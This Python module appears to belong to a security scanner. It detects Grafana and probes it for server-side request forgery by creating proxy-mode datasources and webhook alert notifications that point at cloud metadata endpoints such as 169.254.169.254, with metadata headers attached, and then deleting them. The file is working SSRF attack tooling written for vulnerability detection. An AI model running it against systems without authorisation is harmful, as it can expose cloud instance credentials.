"""Grafana datasource proxy SSRF detection.

Tests Grafana instances for SSRF via the datasource proxy feature.
Grafana's `access: "proxy"` mode makes it act as a reverse proxy to
datasource URLs, allowing server-side request forgery.

References:
- https://github.com/RandomRobbieBF/grafana-ssrf
- CVE-2021-43798 (unauthenticated file read, different vector)
"""

import logging
from typing import Any

import httpx

logger = logging.getLogger(__name__)

GRAFANA_HEALTH_PATHS = ["/api/health", "/login", "/"]
GRAFANA_DATASOURCE_API = "/api/datasources"
GRAFANA_PROXY_PREFIX = "/api/datasources/proxy"
GRAFANA_ALERT_NOTIFICATIONS = "/api/alert-notifications"

CLOUD_METADATA_URLS = [
    "http://169.254.169.254/computeMetadata/v1/",
    "http://169.254.169.254/latest/meta-data/",
    "http://metadata.google.internal/computeMetadata/v1/",
    "http://100.100.100.200/latest/meta-data/",
]

CUSTOM_HEADERS = [
    {"Metadata-Flavor": "Google"},
    {"X-aws-ec2-metadata-token": "test-token"},
]


async def detect_grafana(
    base_url: str,
    timeout: float = 10.0,
) -> dict[str, Any]:
    """Detect if a URL is running Grafana."""
    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, verify=True) as client:
        for path in GRAFANA_HEALTH_PATHS:
            try:
                resp = await client.get(f"{base_url}{path}")
                if path == "/api/health" and resp.status_code == 200:
                    data = resp.json()
                    if "database" in data or "version" in data:
                        return {
                            "is_grafana": True,
                            "version": data.get("version", "unknown"),
                            "database": data.get("database", "unknown"),
                            "commit": data.get("commit", ""),
                        }
                elif path == "/login" and resp.status_code == 200:
                    if "grafana" in resp.text.lower():
                        return {"is_grafana": True, "version": "unknown"}
            except (httpx.RequestError, ValueError):
                continue
    return {"is_grafana": False}


async def test_datasource_ssrf(
    base_url: str,
    session_cookie: str,
    ssrf_url: str,
    timeout: float = 10.0,
    http_headers: dict[str, str] | None = None,
) -> list[dict[str, Any]]:
    """Test Grafana datasource proxy for SSRF."""
    findings: list[dict[str, Any]] = []
    datasource_id: str | None = None

    headers = {
        "Content-Type": "application/json",
        "Accept": "application/json",
        "x-grafana-org-id": "1",
    }
    if http_headers:
        headers.update(http_headers)

    cookies = {"grafana_session": session_cookie} if session_cookie else {}

    json_data: dict[str, Any] = {
        "tlsSkipVerify": True,
        "httpMethod": "GET",
    }
    secure_json_data: dict[str, str] = {}
    for i, header_dict in enumerate(CUSTOM_HEADERS):
        for name, value in header_dict.items():
            json_data[f"httpHeaderName{i + 1}"] = name
            secure_json_data[f"httpHeaderValue{i + 1}"] = value

    datasource_payload: dict[str, Any] = {
        "name": f"SSRF-TEST-{ssrf_url.split('//')[-1][:30]}",
        "type": "prometheus",
        "access": "proxy",
        "url": ssrf_url,
        "isDefault": False,
        "jsonData": json_data,
        "secureJsonData": secure_json_data,
    }

    async with httpx.AsyncClient(
        timeout=timeout,
        follow_redirects=True,
        verify=True,
        headers=headers,
        cookies=cookies,
    ) as client:
        try:
            resp = await client.post(
                f"{base_url}{GRAFANA_DATASOURCE_API}",
                json=datasource_payload,
            )
            if resp.status_code == 200:
                data = resp.json()
                datasource_id = str(data.get("id", ""))
            elif "already exists" in resp.text.lower():
                findings.append(
                    {
                        "type": "grafana_datasource_ssrf",
                        "severity": "medium",
                        "url": base_url,
                        "details": "Datasource name conflict — manual cleanup may be needed",
                    }
                )
                return findings
        except (httpx.RequestError, ValueError):
            return findings

        if not datasource_id:
            return findings

        try:
            resp = await client.get(
                f"{base_url}{GRAFANA_PROXY_PREFIX}/{datasource_id}/",
            )
            if resp.status_code != 502 and resp.status_code != 404:
                findings.append(
                    {
                        "type": "grafana_datasource_proxy_ssrf",
                        "severity": "critical",
                        "url": base_url,
                        "ssrf_target": ssrf_url,
                        "response_status": resp.status_code,
                        "response_size": len(resp.text),
                        "datasource_id": datasource_id,
                        "details": f"Proxy returned {resp.status_code} (not 502/404) — possible SSRF",
                    }
                )
        except (httpx.RequestError, ValueError):
            pass

        if datasource_id:
            try:
                await client.delete(
                    f"{base_url}{GRAFANA_DATASOURCE_API}/{datasource_id}",
                )
            except Exception:
                logger.warning("Failed to cleanup datasource %s", datasource_id)

    return findings


async def test_alert_notification_ssrf(
    base_url: str,
    session_cookie: str,
    ssrf_url: str,
    timeout: float = 10.0,
) -> list[dict[str, Any]]:
    """Test Grafana alert notification webhook for SSRF."""
    findings: list[dict[str, Any]] = []
    notification_id: str | None = None

    headers = {"Content-Type": "application/json", "x-grafana-org-id": "1"}
    cookies = {"grafana_session": session_cookie} if session_cookie else {}

    async with httpx.AsyncClient(
        timeout=timeout, follow_redirects=True, verify=True, headers=headers, cookies=cookies
    ) as client:
        payload = {
            "name": f"SSRF-WEBHOOK-{ssrf_url.split('//')[-1][:20]}",
            "type": "webhook",
            "isDefault": False,
            "sendReminder": True,
            "settings": {
                "url": ssrf_url,
                "httpMethod": "GET",
            },
        }

        try:
            resp = await client.post(
                f"{base_url}{GRAFANA_ALERT_NOTIFICATIONS}",
                json=payload,
            )
            if resp.status_code == 200:
                data = resp.json()
                notification_id = str(data.get("id", ""))
        except (httpx.RequestError, ValueError):
            return findings

        if notification_id:
            try:
                resp = await client.get(
                    f"{base_url}{GRAFANA_ALERT_NOTIFICATIONS}/{notification_id}",
                )
                findings.append(
                    {
                        "type": "grafana_alert_notification_ssrf_test",
                        "severity": "high",
                        "url": base_url,
                        "ssrf_target": ssrf_url,
                        "notification_id": notification_id,
                        "details": "Alert notification webhook created — may trigger SSRF on alert",
                    }
                )
            except Exception:
                pass

            try:
                await client.delete(
                    f"{base_url}{GRAFANA_ALERT_NOTIFICATIONS}/{notification_id}",
                )
            except Exception:
                pass

    return findings


async def scan_grafana_ssrf(
    base_url: str,
    session_cookie: str = "",
    username: str = "",
    password: str = "",
    ssrf_urls: list[str] | None = None,
    timeout: float = 10.0,
) -> list[dict[str, Any]]:
    """Full Grafana SSRF scan."""
    grafana_info = await detect_grafana(base_url, timeout)
    if not grafana_info.get("is_grafana"):
        return []

    findings = [
        {
            "type": "grafana_detected",
            "severity": "info",
            "url": base_url,
            "version": grafana_info.get("version", "unknown"),
            "details": "Grafana instance detected",
        }
    ]

    if username and password:
        session_cookie = await _login_grafana(base_url, username, password, timeout)

    if ssrf_urls is None:
        ssrf_urls = CLOUD_METADATA_URLS

    for ssrf_url in ssrf_urls:
        findings.extend(await test_datasource_ssrf(base_url, session_cookie, ssrf_url, timeout))
        findings.extend(
            await test_alert_notification_ssrf(base_url, session_cookie, ssrf_url, timeout)
        )

    logger.info(
        "Grafana SSRF scan: %s found %d findings",
        base_url,
        len(findings),
    )
    return findings


async def _login_grafana(
    base_url: str,
    username: str,
    password: str,
    timeout: float,
) -> str:
    """Login to Grafana and return session cookie."""
    async with httpx.AsyncClient(timeout=timeout, follow_redirects=True, verify=True) as client:
        resp = await client.post(
            f"{base_url}/login",
            json={"user": username, "password": password},
        )
        for cookie_name in ("grafana_session", "grafana_sess"):
            if cookie_name in resp.cookies:
                return resp.cookies[cookie_name]
    return ""
